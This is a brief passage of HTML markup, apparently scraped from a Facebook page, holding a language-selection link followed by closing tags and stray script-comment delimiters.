<a role="button" href="#" title="Use Facebook in another language." ajaxify="/settings/language/language/?uri=https%3A%2F%2Fwww.facebook.com%2F%3Fstype%3Dlo%26jlou%3DAfdeVP7mxuWYvkq387p2iIDh0K_taIAWYfsixkWV5z5IQlJN9ODDjR4GSrOADB5qC-osrcimfkSBW_OGhZi2WyVw%26smuh%3D9394%26lh%3DAc_HWG-CZB2Tonif&source=TOP_LOCALES_DIALOG" rel="dialog">English (US)</a>
</div>
</div>
</div>
</div>
</div>
</body>
</html>
*/}
);